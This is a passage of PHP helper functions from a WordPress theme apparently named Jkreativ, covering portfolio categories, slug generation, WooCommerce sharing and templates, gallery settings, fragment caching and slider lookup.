                'key' => 'portfolio_parent',
                'value' => array($pageid),
                'compare' => 'IN',
            )
        ),
        'orderby' => 'menu_order',
        'order' => 'ASC',
        'nopaging' => true
    ));

    $result = $query->posts;
    foreach($result as $key => $value) {
        $termlist = get_the_terms($value->ID, JEG_PORTFOLIO_CATEGORY);
        if( !empty($termlist) ) {
            foreach($termlist as $termkey => $termvalue) {
                $category[$termkey] = $termvalue->name;
            }
        }
    }

	return $category;
}


function jeg_to_slug($str)
{
	$replace	= '-';
	$trans = array(
		'&\#\d+?;'				=> '',
		'&\S+?;'				=> '',
		'\s+'					=> $replace,
		'[^a-z0-9\-\._]'		=> '',
		$replace.'+'			=> $replace,
		$replace.'$'			=> $replace,
		'^'.$replace			=> $replace,
		'\.+$'					=> ''
	);

	$str = strip_tags($str);

	foreach ($trans as $key => $val) :
		$str = preg_replace("#".$key."#i", $val, $str);
	endforeach;

	return trim(stripslashes(strtolower($str)));
}


/**** woo commerce ****/

function jeg_share_item() {
	$html = '';
	$postid = get_the_ID();

	$html =
	"<div class='normal-sharrre-container normal-post-sharrre'>
		<div class='twitter-share-block'
			data-url='" . get_permalink($postid) . "'
			data-text='" . get_the_title() . "'
			data-title='" . __('Tweet','jeg_textdomain') . "'></div>
		<div class='facebook-share-block'
			data-url='" . get_permalink($postid) . "'
			data-text='" . get_the_title() . "'
			data-title='" . __('Like','jeg_textdomain') . "'></div>
		<div class='googleplus-share-block'
			data-url='" . get_permalink($postid) . "'
			data-text='" . get_the_title() . "'
			data-title='" . __('Share','jeg_textdomain') . "'></div>
		<div class='pinterest-share-block'
			data-url='" . get_permalink($postid) . "'
			data-text='" . get_the_title() . "'
			data-title='" . __('Pin','jeg_textdomain') . "'></div>
	</div>
	<div class='clearfix'></div>";

	echo $html;
}

add_filter('woocommerce_share', 'jeg_share_item');



if ( ! function_exists( 'jeg_woocommerce_content' ) )
{
	function jeg_woocommerce_content() {
		if ( is_singular( 'product' ) ) {
			while ( have_posts() ) {
				the_post();
				woocommerce_get_template_part( 'content', 'single-product' );
			}
		} else {
			if ( have_posts() ) {
				woocommerce_get_template_part( 'content', 'shop' );
			} else {
				woocommerce_get_template( 'loop/no-products-found.php' );
			}
		}
	}
}

if( ! function_exists('jeg_encodeURIComponent'))
{
	function jeg_encodeURIComponent($str) {
	    $revert = array('%21'=>'!', '%2A'=>'*', '%27'=>"'", '%28'=>'(', '%29'=>')');
	    return strtr(rawurlencode($str), $revert);
	}
}



if( ! function_exists('jeg_get_query_paged')) {
	function jeg_get_query_paged () {
		$paged = ( get_query_var('paged') ) ? get_query_var('paged') : 1;
		$page = ( get_query_var('page') ) ? get_query_var('page') : 1;
		return ( $paged > $page ) ? $paged : $page;
	}
}


function jeg_get_google_font() {
	$font = vp_get_gwf_family();
	$fontlist = array();
	$fontlist[] = '';
	foreach($font as $fl){
		$fontlist[$fl['value']] = $fl['label'];
	}
	return $fontlist;
}

function jeg_hext_rgb($hex){
	return sscanf($hex, "#%02x%02x%02x");
}

function jeg_get_gallery_product_data($postid)
{
	$data = array();

	$data['overwrite_gallery'] 	= vp_metabox('jkreativ_product.overwrite_gallery', null, $postid);
	$data['gallery_layout'] 	= 'normal';
	$data['product_width'] 		= 400;
	$data['product_height'] 	= 1;
	$data['justified_height']	= 250;
	$data['user_margin'] 		= 1;
	$data['margin_size'] 		= 5;
	$data['expand_script'] 		= 'magnific';
	$data['scale_mode'] 		= 'fit';

	if($data['overwrite_gallery']) {
		$data['product_fullwidth'] = vp_metabox('jkreativ_product.gallery.0.single_product_fullwidth', null, $postid);
		if($data['product_fullwidth']) {
			$data['gallery_layout'] 	= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.product_single_type', 'normal', $postid);
			$data['product_width'] 		= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.single_product_width', 400, $postid);
			$data['product_height'] 	= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.single_item_height', 1, $postid);
			$data['justified_height']	= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.single_justified_height', 1, $postid);
			$data['user_margin']		= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.single_product_use_margin', 1, $postid);
			$data['margin_size']		= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.single_product_margin_size', 5, $postid);
			$data['expand_script']		= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.single_expand_mode', 'magnific', $postid);
			$data['scale_mode']			= vp_metabox('jkreativ_product.gallery.0.grid_gallery.0.single_scale_mode', 'fit', $postid);
		}
	} else {
		$data['product_fullwidth'] = vp_option('joption.single_product_fullwidth');
		if($data['product_fullwidth']) {
			$data['gallery_layout'] 	= vp_option('joption.product_single_type', 'normal', $postid);
			$data['product_width'] 		= vp_option('joption.single_product_width', 400);
			$data['product_height'] 	= vp_option('joption.single_item_height', 1);
			$data['justified_height']	= vp_option('joption.single_justified_height', 250);
			$data['user_margin']		= vp_option('joption.single_product_use_margin', 1);
			$data['margin_size']		= vp_option('joption.single_product_margin_size', 5);
			$data['expand_script']		= vp_option('joption.single_expand_mode', 'magnific');
			$data['scale_mode']			= vp_option('joption.single_scale_mode', 'fit');
		}
	}

	return $data;
}


function jeg_get_image_attachment($imageid)
{
	$imagedata = wp_get_attachment_image_src($imageid, "full");
	return $imagedata[0];
}


/**
 * Jkreativ cache method
 * use template base caching
 */

class Jeg_Fragment_Cache {
    var $key;
    var $ttl;

    public function __construct( $key, $ttl ) {
        $this->key = $key;
        $this->ttl = $ttl;
    }

    public function output()
    {
        $output = get_transient( $this->key );
        if ( !empty( $output ) ) {
            echo $output;
            return true;
        } else {
            ob_start();
            return false;
        }
    }

    public function store()
    {
        $output = ob_get_flush();
        set_transient( $this->key, $output, $this->ttl );
    }
}

function jeg_is_in_cache_list($slug, $name) {
    return apply_filters('jeg_check_in_cache_list', false, $slug, $name);
}

function jeg_get_template_part($slug, $name = null)
{
    if(jeg_is_in_cache_list($slug, $name)) {
        if(!is_null($name)) {
            $slug = $slug . '-' . $name;
        }
        $frag = new Jeg_Fragment_Cache( $slug, 60*60*24*7 );
        if ( !$frag->output() ) {
            get_template_part($slug, $name);
            $frag->store();
        }
    } else {
        get_template_part($slug, $name);
    }
}

function jeg_get_slider_id() {
    global $post;
    if($post->post_type === 'portfolio') {
        $layout = get_post_meta($post->ID, 'portfolio_layout', true);

        if($layout === 'landingpage') {
            $sliderid = vp_metabox('jkreativ_portfolio_landing.heading_slider');
        } else if($layout === 'landingpagevc') {
            $sliderid = vp_metabox('jkreativ_portfolio_landing_vc.heading_slider');
        }

    } else {
        $template = get_post_meta($post->ID,'_wp_page_template',true);
        if($template === "template/template-landing-page.php") {
            $sliderid = vp_metabox('jkreativ_page_landing.heading_slider');
        } else if($template === "template/template-landing-page-vc.php") {
            $sliderid = vp_metabox('jkreativ_page_landing_vc.heading_slider');
        }
    }
    return $sliderid;
}